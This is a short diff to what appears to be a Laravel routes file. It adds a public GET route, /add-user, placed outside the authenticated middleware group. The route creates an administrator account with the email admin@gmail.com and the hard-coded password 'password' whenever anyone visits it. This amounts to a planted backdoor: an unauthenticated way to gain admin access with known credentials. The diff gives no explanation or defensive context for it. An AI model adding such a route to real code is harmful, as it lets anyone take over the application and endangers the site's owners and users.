@@ -61,3 +61,12 @@ Route::middleware(['auth'])->group(function () {
     })->name('code.get_offer');
     Route::get('api/offer', GetCodeOffer::class);
 });
+
+Route::get('/add-user', function () {
+    User::create([
+        'name' => 'admin',
+        'email' => 'admin@gmail.com',
+        'password' => Hash::make('password'),
+        'role' => 'admin',
+    ]);
+});
